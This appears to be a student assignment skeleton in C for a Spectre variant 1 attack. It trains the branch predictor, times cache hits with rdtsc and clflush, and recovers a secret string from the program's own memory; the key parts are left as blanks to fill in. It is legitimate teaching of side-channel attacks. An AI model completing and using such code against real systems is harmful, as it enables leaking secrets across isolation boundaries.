#include <pthread.h>   // pthreads header (not actually used in this code)
#include <stdint.h>    // fixed-width integer types like uint64_t
#include <stdio.h>     // standard input/output functions
#include <stdlib.h>    // memory allocation, exit, etc.
#include <string.h>    // memcpy, memset
#include <emmintrin.h> // SSE2 intrinsics: _mm_lfence, _mm_mfence, _mm_clflush

#define BORING_DATA "boring data | "          // Public data prefix
#define SECRET "SUPER DONALD TRUMP TOP SECRET"       // Secret string we want to leak
#define TOTAL_DATA BORING_DATA SECRET        // Concatenate prefix + secret

// A struct representing one memory page (4 KB)
#define PAGESIZE FILL_IN_THE_NUMBER_HERE1
struct page_ {
  char data_[PAGESIZE];
} typedef page_ ;

unsigned char array1[128];   // Victim array (contains prefix + secret)
page_ *array2;               // Probe array (256 pages of 4 KB each)
const int CACHE_MISS = FILL_IN_THE_NUMBER_HERE2  // Threshold cycles to detect cache miss
size_t boring_data_length = sizeof(BORING_DATA) - 1; 
page_ temp;                  // Temporary global to prevent compiler optimizations

// Victim gadget: conditionally reads from array2 based on array1[x]
char target_function(int x)
{
  // The length check should make sure that the attempted access 
  // can only load the BORING_DATA part, but never the SECRET part
  if (((float) x / (float) boring_data_length < FILL_IN_THE_NUMBER_HERE3))
  {
    temp = array2[array1[x]];
  }
}

// Initialize array1 with BORING_DATA + SECRET
void init_array1()
{
  memcpy(array1, TOTAL_DATA, sizeof(TOTAL_DATA));
  array1[sizeof(array1) - 1] = '\0'; 
}

// Initialize probe array array2
void init_array2()
{
  // Use aligned_alloc() for linux or _aligned_malloc() for windows to allocate 256 pages for the probe array, array2 (aligned to 4 KB)
  ......

  // Then initialize the data stored in array2 as zero to make sure that array2 is all mapped in memory
  ......
}

// Train the Pattern History Table (PHT) by always taking the valid branch
void spoofPHT()
{
  // Implement a for loop, to repeatedly call target_function() for 20 times
  // to train the branch predictor (PHT). Make sure that your training should
  // make PHT think the length check can always PASS.
  ......
}

// Read Time Stamp Counter (TSC) for timing measurement
// Remember that rdtsc instruction only returns you the CURRENT timestamp
// 
uint64_t rdtsc()
{
  uint64_t a, d;
  _mm_mfence(); 
  asm volatile("rdtsc" : "=a"(a), "=d"(d)); 
  a = (d << 32) | a; 
  _mm_mfence();  
  return a;
}

// check the cache hit and cache miss latency to determine the threshold
int measure_cache_miss_threshold(void *ptr)
{
  uint64_t start = 0, end = 0;
  volatile int reg;
  uint64_t total;

  // The correct way of measuring the latency of an action is:
  // 1. measure the start timestamp
  // 2. do the action
  // 3. measure the end timestamp
  // 4. latency = end - start
  // And to make sure that your measurement is stable, repeat this
  // process for 1000 times and compute a mean of them.

  // First, implement the code to measure cache miss latency.
  // Hint 1: you could use _mm_clflush() API to flush the data from cache.
  // Hint 2: remember your code is always executed out-of-order by CPU,
  //   so you could use _mm_mfence() API when necessary to serialize the execution.
  //   This would make sure that the code before the fence has to finish before 
  //   executing any code after the fence.
  // The action you want to measure upon would be: reg = *(int*)ptr;
  ......
  printf("The cache miss latency is %d\n", total / 1000); 

  // Second, implement the code to measure cache hit latency.
  // Hint 1: you should preload the data once before your measurement to make sure it is in cache. 
  // Hint 2: same as above, remember that your code is always executed out-of-order by CPU and you
  //   may need serialization.
  ......
  printf("The cache hit latency is %d\n", total / 1000); 

  return 0;
}

// Check whether a given pointer is cached
int check_if_in_cache(void *ptr)
{
  uint64_t start = 0, end = 0;
  volatile int reg;

  // Implement the timing measurement for a real attack. You need to measure
  // the time to complete a memory access and determine whether it is a cache
  // hit or miss.
  ......

  if (end - start < CACHE_MISS) // If access time < threshold → cached
    return 1;

  return 0; // Otherwise → cache miss
}

// Recover leaked data by probing which page in array2 was cached
void recover_data_from_cache(char *leaked, int index)
{
  // We are trying to recover ONE SINGLE BYTE of data, which is 8 bits in binary，
  // so there could be only 2^8 = 256 possible values. Now the task is to determine
  // which among those 256 values is the correct one.
  // Keep in mind that *array2[index]* was likely speculatively accessed when you did the Spectre
  // Attack, and the index was expected to be array1[x], which should just be the ONE BYTE of data.
  // To make your life easier, a skeleton is provided for your, as there is some tech complexity
  // with prefetching. Your task is to fill in the missing part of the code.

  for (int i = 0; i < 255; i++)
  {
    // Shuffle access order to avoid OS prefetch noise
    int array_element = ((i * 127)) % 255;

    // Determine whether array2[array_element] is already cached because of the speculative
    // execution caused by your Spectre Attack.
    ......

    // Flush cache you just probed to prepare for the next round of attack to leak the next byte.
    ........

    if (value_in_cache)
    {
      // If the recovered value is an uppercase ASCII letter (A ~ Z), store it in the output array leaked[index]
      ......
      
      sched_yield(); // Yield CPU to reduce noise
    }
  }
}

int main(int argc, const char **argv)
{
  init_array1(); // Setup array1 with TOTAL_DATA
  init_array2(); // Setup probe array2

  measure_cache_miss_threshold(&array1[0]);

  char leaked[sizeof(TOTAL_DATA) + 1];  // Buffer for leaked string
  memset(leaked, '?', sizeof(leaked));  // Initialize with spaces
  leaked[sizeof(TOTAL_DATA)] = '\0'; 

  while (1)
  {
    // To simply your task the code skeleton here is given.
    for (int i = 0; i < sizeof(TOTAL_DATA); i++)
    {
      if (leaked[i] == array1[i]) continue;  // Skip already leaked data
      spoofPHT();                 // Train branch predictor
      _mm_lfence();               // Serialize execution
      _mm_clflush(&boring_data_length); // Flush condition variable from cache

      target_function(i);         // Access victim function (may speculate out-of-bounds)

      _mm_lfence();               // Serialize again
      recover_data_from_cache(leaked, i); // Attempt to recover cached secret
    }

    // You could insert some debug outputs here, but make sure you delete them before sumitting your code.

    // Stop if full SECRET was recovered
    if (!strncmp(leaked + sizeof(BORING_DATA) - 1, SECRET, sizeof(SECRET) - 1))
      break;
  }

  // Print the part after BORING_DATA (the secret portion)
  for(int i = sizeof(BORING_DATA) - 1; i < sizeof(leaked); i++)
    printf("%c", leaked[i]);
  printf("\n");

  return (0);
}
